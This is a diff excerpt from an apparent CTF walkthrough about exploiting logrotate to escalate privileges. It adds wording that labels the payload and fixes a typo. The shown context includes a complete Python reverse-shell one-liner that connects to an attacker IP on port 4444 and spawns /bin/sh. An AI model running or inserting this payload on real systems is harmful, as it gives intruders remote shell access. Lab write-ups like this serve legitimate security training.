@@ -532,7 +532,7 @@ include /etc/logrotate.d
 
 Actually, we already knew that it is “create” because we saw the files in our home directory, but it is better to check.
 
-Now, we have to prepare a payload file. We edit a payload file `reader@book:~$ nano payload` and write the follwing:
+Now, we have to prepare a payload file. We edit a payload file `reader@book:~$ nano payload` and write the following classic Python reverse shell code:
 
 ~~~
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.18",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
